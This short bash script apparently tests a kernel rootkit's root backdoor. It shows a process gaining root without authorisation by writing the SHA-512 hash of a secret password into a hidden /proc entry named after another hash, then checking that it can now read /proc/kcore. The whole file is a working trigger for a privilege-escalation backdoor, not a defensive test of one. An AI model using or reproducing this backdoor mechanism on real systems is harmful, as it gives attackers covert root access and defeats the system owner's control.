#!/usr/bin/env bash


# The testing script for the root backdoor functionality.


sha512() {
    printf '%s' "${1}" | sha512sum | cut -d ' ' -f1
}


id && \
    file /proc/kcore # We can't read because we are not root.

printf '%s' a_wrong_try > /proc/$(sha512 rootme) && \
    printf '%s' $(sha512 r00tme) > /proc/$(sha512 rootme) && \
    id && \
    file /proc/kcore # We can read we are now root!
